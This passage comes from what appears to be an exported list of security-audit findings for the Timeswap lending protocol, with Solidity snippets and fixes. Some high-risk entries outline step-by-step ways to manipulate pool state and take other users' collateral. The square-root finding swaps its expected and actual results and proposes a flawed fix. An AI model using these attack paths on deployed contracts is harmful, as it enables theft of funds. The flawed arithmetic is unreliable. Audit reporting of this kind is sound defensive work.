https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol#L19-L22  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (z % y > 0) z++; } ```  For example, when `y = 9`: -   At L20, z = sqrt(9) = 3 -   At L21, z % y = 3 % 9 = 3, so that `z % y > 0` is true, therefore, `z++`, z is 4   Expected Results: sqrtUp(9) = 4  Actual Results: sqrtUp(9) = 3  ### Recommendation  Change to:  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (z * z < y) ++z; } ``` or  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (y % z != 0) ++z; } ```  "}, {"title": "Simplify `SquareRoot#sqrt()` can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/174", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  The check of `y > 3` is unnecessary and most certainly adds more gas cost than it saves as the majority of use cases of this function will not be handling `y <= 3`.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol#L6-L17  ```solidity function sqrt(uint256 y) internal pure returns (uint256 z) {     if (y > 3) {         z = y;         uint256 x = y / 2 + 1;         while (x < z) {             z = x;             x = (y / x + x) / 2;         }     } else if (y != 0) {         z = 1;     } } ```  ### Recommendation  Change to:  ```solidity function sqrt(uint x) public pure returns (uint y) {     uint z = (x + 1) / 2;     y = x;     while (z < y) {         y = z;         z = (x / z + z) / 2;     } } ```  Or use:  https://github.com/Rari-Capital/solmate/blob/dd13c61b5f9cb5c539a7e356ba94a6c2979e9eb9/src/utils/FixedPointMathLib.sol#L150-L205   "}, {"title": "`SafeCast.sol#toUint128()` Validation of input value can be done earlier to save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/173", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  Check input value earlier can avoid unnecessary code execution when this check failed.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/SafeCast.sol#L13-L15  ```solidity function toUint128(uint256 x) internal pure returns (uint128 y) {     require((y = uint128(x)) == x); } ```  See: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4961a51cc736c7d4aa9bd2e11e4cbbaff73efee9/contracts/utils/math/SafeCast.sol#L48  ### Recommendation  Change to:  ```solidity function toUint128(uint256 value) internal pure returns (uint128) {     require(value <= type(uint128).max, \"SafeCast: value doesn't fit in 128 bits\");     return uint128(value); } ```  `SafeCast.sol#toUint112()` got the similar issue.  "}, {"title": "For uint `> 0` can be replaced with ` != 0` for gas optimization", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/172", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  0x0x0x   # Vulnerability details  ## Impact  `!= 0` is a cheaper operation compared to `> 0`, when dealing with `uint`.  ## Occurrences  ```  ./Timeswap-V1-Convenience/contracts/base/ERC721.sol:147:            } else if (_return.length > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Burn.sol:40:        if (tokensOut.asset > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Burn.sol:65:        if (tokensOut.collateral > 0) { ./Timeswap-V1-Convenience/contracts/libraries/DateTime.sol:128:        if (year >= 1970 && month > 0 && month <= 12) { ./Timeswap-V1-Convenience/contracts/libraries/DateTime.sol:130:            if (day > 0 && day <= daysInMonth) { ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:296:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:455:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:614:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Pay.sol:86:        if (collateralOut > 0) { ./Timeswap-V1-Convenience/contracts/libraries/PayMath.sol:27:                if (due.debt > 0) { ./Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol:21:        if (z % y > 0) z++; ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:40:        if (tokensOut.asset > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:58:        if (tokensOut.collateral > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:75:        if (params.claimsIn.bond > 0) ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:77:        if (params.claimsIn.insurance > 0) ./Timeswap-V1-Core/contracts/TimeswapPair.sol:153:        require(xIncrease > 0 && yIncrease > 0 && zIncrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:170:        require(liquidityOut > 0, 'E212'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:203:        require(liquidityIn > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:217:        if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:218:        if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:236:        require(xIncrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:239:        require(pool.state.totalLiquidity > 0, 'E206'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:274:        require(claimsIn.bond > 0 || claimsIn.insurance > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:292:        if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:293:        if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:311:        require(xDecrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:314:        require(pool.state.totalLiquidity > 0, 'E206'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:369:        if (assetIn > 0) Callback.pay(asset, assetIn, data); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:374:        if (collateralOut > 0) collateral.safeTransfer(to, collateralOut); ./Timeswap-V1-Core/contracts/libraries/FullMath.sol:34:                require(denominator > 0); ./Timeswap-V1-Core/contracts/libraries/FullMath.sol:124:        if (mulmod(a, b, denominator) > 0) result++; ./Timeswap-V1-Core/contracts/libraries/Math.sol:7:        if (x % y > 0) z++;  ```  "}, {"title": "Use short reason strings can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/171", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  Every reason string takes at least 32 bytes.  Use short reason strings that fits in 32 bytes or it will become more expensive.  Instances include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/base/ERC721.sol#L55-L58  ```solidity require(     owner == msg.sender || isApprovedForAll[owner][msg.sender],     'ERC721 :: approve : Approve caller is not owner nor approved for all' ); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/base/ERC721.sol#L96-L99  ```solidity require(     _checkOnERC721Received(address(0), to, id, ''),     'ERC721 :: _safeMint : Transfer to non ERC721Receiver implementer' ); ```  "}, {"title": "Unnecessary checked arithmetic in for loops", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/170", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  There is no risk of overflow caused by increamenting the iteration index in for loops (the `i++` in for `for (uint256 i; i < ids.length; i++)`).  Increments perform overflow checks that are not necessary in this case.  ### Recommendation  Surround the increment expressions with an `unchecked { ... }` block to avoid the default overflow checks. For example, change the for loop:   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L21-L33  ```solidity for (uint256 i; i < ids.length; i++) {     IPair.Due memory due = pair.dueOf(maturity, address(collateralizedDebt), ids[i]);      if (assetsIn[i] > due.debt) assetsIn[i] = due.debt;     if (msg.sender == collateralizedDebt.ownerOf(ids[i])) {         uint256 _collateralOut = due.collateral;         if (due.debt > 0) {             _collateralOut *= assetsIn[i];             _collateralOut /= due.debt;         }         collateralsOut[i] = _collateralOut.toUint112();     } } ```  to:  ```solidity for (uint256 i; i < ids.length;) {     IPair.Due memory due = pair.dueOf(maturity, address(collateralizedDebt), ids[i]);      if (assetsIn[i] > due.debt) assetsIn[i] = due.debt;     if (msg.sender == collateralizedDebt.ownerOf(ids[i])) {         uint256 _collateralOut = due.collateral;         if (due.debt > 0) {             _collateralOut *= assetsIn[i];             _collateralOut /= due.debt;         }         collateralsOut[i] = _collateralOut.toUint112();     }      unchecked { ++i; } } ```   "}, {"title": "`TimeswapConvenience.sol#borrowGivenDebt()` Attacker can increase `state.y` to an extremely large value with a dust amount of `assetOut`", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/169", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53  This issue is similar to the two previous issues related to `state.y` manipulation. Unlike the other two issues, this function is not on `TimeswapPair.sol` but on `TimeswapConvenience.sol`, therefore this can not be solved by adding `onlyConvenience` modifier.  Actually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.  ## Impact  - When `pool.state.y` is extremely large, many core features of the protocol will malfunction, as the arithmetic related to `state.y` can overflow. For example:  LendMath.check(): https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28  BorrowMath.check(): https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31  - An attacker can set `state.y` to a near overflow value, then `lend()` to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers.   "}, {"title": "`TimeswapPair.sol#mint()` Malicious user/attacker can mint new liquidity with an extremely small amount of `yIncrease` and malfunction the pair with the maturity", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/165", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MintMath.sol#L14-L34  The current implementation of `TimeswapPair.sol#mint()` allows the caller to specify an arbitrary value for `yIncrease`.  However, since `state.y` is expected to be a large number based at `2**32`, once the initial `state.y` is set to a small number (1 wei for example), the algorithm won't effectively change `state.y` with regular market operations (`borrow`, `lend` and `mint`).  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L17-L37  The pair with the maturity will malfunction and can only be abandoned.  A malicious user/attacker can use this to frontrun other users or the platform's `newLiquidity()` call to initiate a griefing attack.  If the desired `maturity` is a meaningful value for the user/platform, eg, end of year/quarter. This can be a noteworthy issue.  ## Recommendation  Consider adding validation of minimal `state.y` for new liquidity.  Can be `2**32 / 10000` for example.  "}, {"title": "Inline unnecessary internal function can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/163", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  `checkProportional()` is a rather simple one line function, making it inline instead of an internal function call can make the code simpler and save some gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359-L368  ```solidity for (uint256 i; i < ids.length; i++) {     Due storage due = dues[ids[i]];     require(due.startBlock != BlockNumber.get(), 'E207');     if (owner != msg.sender) require(collateralsOut[i] == 0, 'E213');     PayMath.checkProportional(assetsIn[i], collateralsOut[i], due);     due.debt -= assetsIn[i];     due.collateral -= collateralsOut[i];     assetIn += assetsIn[i];     collateralOut += collateralsOut[i]; } ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/PayMath.sol#L7-L14  ```solidity function checkProportional(     uint112 assetIn,     uint112 collateralOut,     IPair.Due memory due ) internal pure {     require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303'); } } ```  Can be changed to:  ```solidity for (uint256 i; i < ids.length; i++) {     Due storage due = dues[ids[i]];     require(due.startBlock != BlockNumber.get(), 'E207');     if (owner != msg.sender) require(collateralsOut[i] == 0, 'E213');     require(uint256(assetIn[i]) * due.collateral >= uint256(collateralOut[i]) * due.debt, 'E303');     due.debt -= assetsIn[i];     due.collateral -= collateralsOut[i];     assetIn += assetsIn[i];     collateralOut += collateralsOut[i]; } ```   "}, {"title": "`TimeswapPair.sol#borrow()` Improper implementation allows attacker to increase `pool.state.z` to a large value", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/162", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  In the current implementation, `borrow()` takes a user input value of `zIncrease`, while the actual collateral asset transferred in is calculated at L319, the state of `pool.state.z` still increased by the value of the user's input at L332.  Even though a large number of `zIncrease` means that the user needs to add more collateral, the attacker can use a dust amount `xDecrease` (1 wei for example) so that the total collateral needed is rather small.  Plus, the attacker can always `pay()` the dust amount of loan to get back the rather large amount of collateral added.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338  ```solidity function borrow(     uint256 maturity,     address assetTo,     address dueTo,     uint112 xDecrease,     uint112 yIncrease,     uint112 zIncrease,     bytes calldata data ) external override lock returns (uint256 id, Due memory dueOut) {     require(block.timestamp < maturity, 'E202');     require(assetTo != address(0) && dueTo != address(0), 'E201');     require(assetTo != address(this) && dueTo != address(this), 'E204');     require(xDecrease > 0, 'E205');      Pool storage pool = pools[maturity];     require(pool.state.totalLiquidity > 0, 'E206');      BorrowMath.check(pool.state, xDecrease, yIncrease, zIncrease, fee);      dueOut.debt = BorrowMath.getDebt(maturity, xDecrease, yIncrease);     dueOut.collateral = BorrowMath.getCollateral(maturity, pool.state, xDecrease, zIncrease);     dueOut.startBlock = BlockNumber.get();      Callback.borrow(collateral, dueOut.collateral, data);      id = pool.dues[dueTo].insert(dueOut);      pool.state.reserves.asset -= xDecrease;     pool.state.reserves.collateral += dueOut.collateral;     pool.state.totalDebtCreated += dueOut.debt;      pool.state.x -= xDecrease;     pool.state.y += yIncrease;     pool.state.z += zIncrease;      asset.safeTransfer(assetTo, xDecrease);      emit Sync(maturity, pool.state.x, pool.state.y, pool.state.z);     emit Borrow(maturity, msg.sender, assetTo, dueTo, xDecrease, id, dueOut); } ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79  ```solidity function getCollateral(     uint256 maturity,     IPair.State memory state,     uint112 xDecrease,     uint112 zIncrease ) internal view returns (uint112 collateralIn) {     uint256 _collateralIn = maturity;     _collateralIn -= block.timestamp;     _collateralIn *= zIncrease;     _collateralIn = _collateralIn.shiftRightUp(25);     uint256 minimum = state.z;     minimum *= xDecrease;     uint256 denominator = state.x;     denominator -= xDecrease;     minimum = minimum.divUp(denominator);     _collateralIn += minimum;     collateralIn = _collateralIn.toUint112(); } ```  ## PoC  Near the maturity time, the attacker can do the following:  1. `borrow()` a dust amount of assets (`xDecrease` = 1 wei) and increase `pool.state.z` to an extremely large value (20x of previous `state.z` in our tests); 2. `pay()` the loan and get back the collateral; 3. `lend()` a regular amount of `state.x`, get a large amount of insurance token; 4. `burn()` the insurance token and get a large portion of the collateral assets from the defaulted loans.  ## Recommendation  Consider making `pair.borrow()` to be `onlyConvenience`, so that `zIncrease` will be a computed value (based on `xDecrease` and current state) rather than a user input value.  "}, {"title": "Remove unnecessary variables can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/161", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/DateTime.sol#L127-L134  ```solidity     function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {         if (year >= 1970 && month > 0 && month <= 12) {             uint daysInMonth = _getDaysInMonth(year, month);             if (day > 0 && day <= daysInMonth) {                 valid = true;             }         }     } ```  The local variable `daysInMonth` is used only once. Making the expression inline can save gas.  ### Recommendation  Change to:  ```solidity     function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {         if (year >= 1970 && month > 0 && month <= 12) {             if (day > 0 && day <= _getDaysInMonth(year, month)) {                 valid = true;             }         }     } ```  Other examples include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Burn.sol#L76-L77  ```solidity         IPair pair = factory.getPair(params.asset, params.collateral);         require(address(pair) != address(0), 'E501'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L556-L558  ```solidity         IDue collateralizedDebt = natives[asset][collateral][maturity].collateralizedDebt;          require(msg.sender == address(collateralizedDebt), 'E701'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L62-L63  ```solidity         uint256 _assetReserve = asset.safeBalance();         require(_assetReserve >= assetReserve + assetIn, 'E304'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L51-L52  ```solidity         uint256 _collateralReserve = collateral.safeBalance();         require(_collateralReserve >= collateralReserve + collateralIn, 'E305'); ```  "}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/159", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L5-L5  ```solidity import {IPair} from '../interfaces/IPair.sol'; ```  `IPair` is unused in `Callback.sol`.  "}, {"title": "`NFTTokenURIScaffold.sol#_isLtoStringTrimmedeapYear()` Check of `flag == 0` can be done earlier", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/157", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  `flag == 0` is cheaper than `temp % 10 == 0`.   Therefore, checking `flag == 0 `first can save some gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L162-L162  ```solidity if (temp % 10 == 0 && flag == 0) ```  ### Recommendation  Change to:  ```solidity     if (flag == 0 && temp % 10 == 0)  ```  Other instances include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L180-L180  ```solidity else if (value % 10 != 0 && flag == 0)  ```  "}, {"title": "Adding unchecked directive can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/156", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.  For example:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L149-L150  ```solidity         require(block.timestamp < maturity, 'E202');         require(maturity - block.timestamp < 0x100000000, 'E208'); ```   `maturity - block.timestamp` will never underflow.   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L31-L33  ```solidity         if (state.reserves.asset >= state.totalClaims.bond) return collateralOut;         uint256 deficit = state.totalClaims.bond;         deficit -= state.reserves.asset; ```  `deficit -= state.reserves.asset` will never underflow.   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MsgValue.sol#L12-L12  ```solidity if (msg.value > value) ETH.transfer(payable(msg.sender), msg.value - value); ```  `msg.value - value` will never underflow.  "}, {"title": "`TimeswapPair.sol#mint()` Avoiding unnecessary code execution using checks can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/155", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  Move storage writes to inside the code block of `if (tokensOut.asset > 0) {...}` can avoid unnecessary code execution when this check doesn't pass and save gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L214-L218  ```solidity         pool.state.reserves.asset -= tokensOut.asset;         pool.state.reserves.collateral -= tokensOut.collateral;          if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);         if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ``` ### Recommendation  Change to:  ```solidity         if (tokensOut.asset > 0) {                 pool.state.reserves.asset -= tokensOut.asset;                 asset.safeTransfer(assetTo, tokensOut.asset);         }         if (tokensOut.collateral > 0) {                 pool.state.reserves.collateral -= tokensOut.collateral;                 collateral.safeTransfer(collateralTo, tokensOut.collateral);         } ```    "}, {"title": "`TimeswapPair.sol#mint()` Implementation can be simpler and save some gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/154", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L157-L169  ```solidity=157 if (pool.state.totalLiquidity == 0) {     uint256 liquidityTotal = MintMath.getLiquidityTotal(xIncrease);     liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);      pool.state.totalLiquidity += liquidityTotal;     pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; } else {     uint256 liquidityTotal = MintMath.getLiquidityTotal(pool.state, xIncrease, yIncrease, zIncrease);     liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);      pool.state.totalLiquidity += liquidityTotal;     pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; } ```  ### Recommendation  Change to:  ```solidity=157 uint256 liquidityTotal = pool.state.totalLiquidity == 0 ?     MintMath.getLiquidityTotal(xIncrease) :     MintMath.getLiquidityTotal(pool.state, xIncrease, yIncrease, zIncrease); liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);  pool.state.totalLiquidity += liquidityTotal; pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; ```  1. Avoiding code duplication; 2. Using the ternary operator to make the code shorter.  "}, {"title": "Cache array length in for loops can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/151", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  Instances include:  - `TimeswapPair.sol#pay()`      https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359-L359   - `PayMath.sol#givenMaxAssetsIn()`      https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L21-L21   "}, {"title": "using storage instead of memory to declare struct variable inside the function", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/141", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  rfa   # Vulnerability details  ## Impact more expensive gas  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L58  instead of caching state on memory. just read it directly from the storage.  State memory state = pools[maturity].state;  ## Tools Used self research on:  https://remix.ethereum.org/  ## Recommended Mitigation Steps State storage state = pools[maturity].state;  "}, {"title": "Open TODOs", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/138", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  ye0lde   # Vulnerability details  # Vulnerability details  ## Impact Open TODOs can point to architecture or programming issues that still need to be resolved.  ## Proof of Concept The TODO is here: https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L87  ## Tools Used VS Code  ## Recommended Mitigation Steps Consider resolving the TODO before deploying.  "}, {"title": "Missing input validation on array lengths (PayMath.sol)", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/137", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  ye0lde   # Vulnerability details  ## Impact  The function below fails to perform input validation on arrays to verify the lengths match.  A mismatch could lead to an exception or undefined behavior.  ## Proof of Concept  `ids`, `assetsIn` (copied into from `maxAssetsIn` on line 18) https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L15-L28  While `givenMaxAssetsIn` is an internal function if you trace the code back the parameters are passed in by an external function (`pay` or `payEthAsset` or `payEthCollateral`) with no array length validation.  ## Tools Used Visual Studio Code, Remix  ## Recommended Mitigation Steps  Add input validation to check that the length of all arrays match (`ids`, `maxAssetsIn`).  "}, {"title": "Typos", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/135", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  ye0lde   # Vulnerability details  # Vulnerability details  ## Impact Typos  ## Proof of Concept The typos are here:  'recommnded' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapFactory.sol#L11 https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L20  'seconde' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/interfaces/IFactory.sol#L39  'addres' 'dcrease' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/interfaces/IPair.sol#L319-L320   ## Tools Used VS Code  ## Recommended Mitigation Steps Correct the typos  "}, {"title": "XSS via SVG Construction contract", 